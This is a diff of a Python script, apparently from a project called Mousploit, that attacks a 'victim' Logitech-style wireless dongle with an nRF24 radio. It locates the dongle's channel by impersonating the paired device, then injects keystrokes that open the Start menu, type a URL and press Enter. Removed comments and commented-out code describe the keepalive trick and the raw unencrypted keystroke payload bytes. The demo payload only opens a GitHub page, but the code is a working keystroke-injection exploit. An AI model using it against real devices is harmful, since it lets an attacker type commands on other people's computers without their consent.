@@ -13,7 +13,6 @@ making sure everything can run smoothly within VS Code as well.
 '''
 sys.path.append(dirname(dirname(__file__)))
 from radio_agent import nrf24
-from utils.hid_scan_codes import *
 from utils.general_utils import *
 
 def main():
@@ -29,39 +28,17 @@ def main():
     # initialize the radio
     radio = nrf24.nrf24()
 
-    '''
-    STEP 1: in order to communicate with the victim dongle, we must identify the frequency channel it uses to communicate with its paired device.
-    We can pretend to be that device (since we have its address), and repeatedly send an arbitrary "ping" payload to the victim dongle, using a different channel each time.
-    We do this until an ACK is received from the dongle, meaning we found the right channel.
-    '''
-    _ = find_address_channel(radio, address)
+    channel = find_frequency_channel(radio, address)
+    if not channel:
+        print("Failed to find frequency channel. Try to get closer to the victim dongle.")
 
-    '''
-    STEP 2: injecting keystrokes of '1' to '9'. But there is a problem - the dongle and paired device could move to a different channel while we do this,
-    thus breaking the attack. According to the whitepaper, they remain on the same channel as long as there is no packet loss. To indicate this, the device
-    sends periodic keepalive packets to its dongle. It has to do so within a known interval/timeout, which is set by the device. If the timeout has passed without
-    the dongle receiving a keepalive packet from the device, they move to a different channel. In addition, even if all keepalives are delivered on time, but the device is idle,
-    the keepalive interval/timeout is increased every once in a while. But that's less important.
-    The whitepaper states that in order to perform a successful attack, "an attacker needs to mimic the keepalive behavior used by Unifying keyboards and mice".
-    So we first send the dongle a packet that sets a relatively long keepalive timeout, and then transmit keepalives very frequently. This way we can be confident
-    that there won't be a timeout that would cause the dongle to switch channels unexpectedly.
-    '''
-    # hid_scan_codes_1_to_9 = [KEY_1, KEY_2, KEY_3, KEY_4, KEY_5, KEY_6, KEY_7, KEY_8, KEY_9]
+    # transmit_string(radio, "1123456789")
 
-    # transmitting payload that sets the keepalive timeout to 1200ms (=0x4B0)
-    radio.transmit_payload(SET_KEEPALIVE_TIMEOUT_PAYLOAD)
-    time.sleep(SLEEPING_PERIOD) # sleeping for 12ms
-
-    # transmitting '1' to '9'
-    # for key in hid_scan_codes_1_to_9:
-    #     # refer to Table 8 in the MouseJack whitepaper: Logitech Unencrypted Keystroke Payload
-    #     radio.transmit_payload(with_checksum([0x00, 0xC1, 0x00, key, 0x00, 0x00, 0x00, 0x00, 0x00])) # third byte is always zero because it's the modifier mask (e.g. Ctrl, Shift, Alt...) which we don't need
-    #     time.sleep(SLEEPING_PERIOD) # sleeping for 12ms
-    #     radio.transmit_payload(KEEPALIVE_PAYLOAD) # transmitting keepalive after each keystroke
-    # # at the end, transmitting a key release packet (scan code = 0x00), otherwise it would keep typing '9' forever
-    # radio.transmit_payload(with_checksum([0x00, 0xC1, 0x00, KEY_RELEASE, 0x00, 0x00, 0x00, 0x00, 0x00]))
-
-    transmit_string(radio, "123456789")
+    # using the search bar of the start menu to open the browser on some URL
+    transmit_keys(radio, ['WINDOWS']) # open the start menu
+    transmit_string(radio, 'www.github.com/avivk9/Mousploit')
+    time.sleep(0.75) # otherwise the Enter keystroke will not be effective, because it takes a moment for the start menu to refresh
+    transmit_keys(radio, ['ENTER'])
 
 if __name__ == "__main__":
     main()
